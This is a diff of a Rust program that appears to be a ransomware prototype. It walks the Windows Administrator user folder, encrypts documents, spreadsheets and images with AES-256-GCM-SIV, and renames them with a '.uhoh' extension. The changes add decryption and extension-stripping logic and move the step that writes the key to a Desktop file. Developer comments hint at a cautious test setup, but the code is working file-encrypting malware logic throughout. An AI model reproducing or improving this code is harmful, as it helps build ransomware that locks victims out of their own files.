@@ -14,11 +14,11 @@ use rand_chacha::rand_core::{RngCore, SeedableRng};
 use rand_chacha::ChaCha20Rng;
 use std::f32::consts::E;
 use std::ffi::OsStr;
-use std::{fmt, fs};
 use std::fs::{File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::PathBuf;
 use std::process::Command;
+use std::{fmt, fs};
 use std::{io, path::Path};
 use walkdir::{DirEntry, Error, WalkDir};
 //TODO: check the speed of this later
@@ -59,12 +59,16 @@ fn main() -> Result<(), std::io::Error> {
                                          // let test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
                                          // writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
     println!("Cipher key before user input: {:?}", hex::encode(&key));
-    let _ = traverse(false, &mut cipher);//decrypt
-    //write hex::
     let mut keyfile = File::create("C:\\Users\\Administrator\\Desktop\\key.txt")?;
     keyfile.write_all(&hex::encode(&key).as_bytes())?;
     writeln!(keyfile, "\n\n\nhello")?;
     drop(keyfile);
+    let _ = traverse(false, &mut cipher); //decrypt
+                                          //write hex::
+                                          // let mut keyfile = File::create("C:\\Users\\Administrator\\Desktop\\key.txt")?;
+                                          // keyfile.write_all(&hex::encode(&key).as_bytes())?;
+                                          // writeln!(keyfile, "\n\n\nhello")?;
+                                          // drop(keyfile);
     Ok(())
 }
 
@@ -113,31 +117,39 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
         "txt", "pdf", "docx", "doc", "pptx", "ppt", "xlsx", "xls", "png", "jpg", "jpeg",
     ];
 
-    //TODO: do NOT change the directory of this yet for safety reasons 
+    //TODO: do NOT change the directory of this yet for safety reasons
     for entry in WalkDir::new("C:\\Users\\Administrator\\").follow_links(true) {
         match entry {
             Ok(entry) => {
                 if let Some(extension) = entry.path().extension() {
                     if entry.file_type().is_file()
-                        && valid_extensions.contains(&extension.to_str().unwrap_or(""))
+                        && (valid_extensions.contains(&extension.to_str().unwrap_or("")) || /*extension is .uhoh */ extension == OsStr::new("uhoh"))
                     {
                         let mut a_file = entry.path();
-                        if do_encrypt {
+                        //if do_encrypt is true and the filename does not end with .uhoh
+                        if do_encrypt && !a_file.to_str().unwrap().ends_with(".uhoh") {
                             let _ = encrypt(a_file, &cipher);
 
                             // change file extension after doing all that
                             let borked_file = format!("{}.uhoh", a_file.to_string_lossy());
                             fs::rename(a_file, borked_file);
                             //TODO: error test this
-                            
                         } else {
-                            
-                            // println!("encrypted file extension: {:?}", a_file.extension());
-                            //TODO: get rid of the extension before decryption
-                            // let mut old_filename = Path::new(a_file).file_stem().unwrap();
-                            // fs::rename(a_file, old_filename);
+                            let old_filename_str = a_file.to_str().unwrap().to_string();
+                            let old_filename_str = old_filename_str.replace(".uhoh", "");
 
-                            match decrypt(a_file, &cipher) {
+                            // Convert the string back to a Path
+                            let old_filename = Path::new(&old_filename_str);
+
+                            // Rename the file
+                            fs::rename(a_file, old_filename);
+
+
+                            if let Some(extension) = entry.path().extension() {
+                                //if
+                            }
+
+                            match decrypt(old_filename, &cipher) {
                                 Ok(_) => {
                                     // let _ = writeln!(
                                     //     a_file.as_ref().unwrap(),
@@ -145,7 +157,7 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
                                     //     entry.path().display()
                                     // );
 
-                                    //TODO: later: 
+                                    //TODO: later:
                                 }
                                 Err(e) => {
                                     // let _ = writeln!(
@@ -157,6 +169,8 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
                                 }
                             }
                         }
+                    } else {
+                        println!("skipped file: {}", entry.path().display());
                     }
                 }
             }
@@ -202,20 +216,11 @@ impl std::fmt::Display for MyError {
     }
 }
 
-// impl From<std::io::Error> for MyError {
-//     fn from(err: std::io::Error) -> Self {
-//         Self {
-//             message: err.to_string(),
-//         }
-//     }
-// }
-
 /**
  * Encrypt a file, using given path and the same key for all files
  * Use different nonce for each file, prepend to file
  */
 fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
-    //open existing "C:\\Users\\win11\\Desktop\\output.txt" and write the path to it
     // Open a file with append option
 
     println!("encrypting file: {}", path.display());
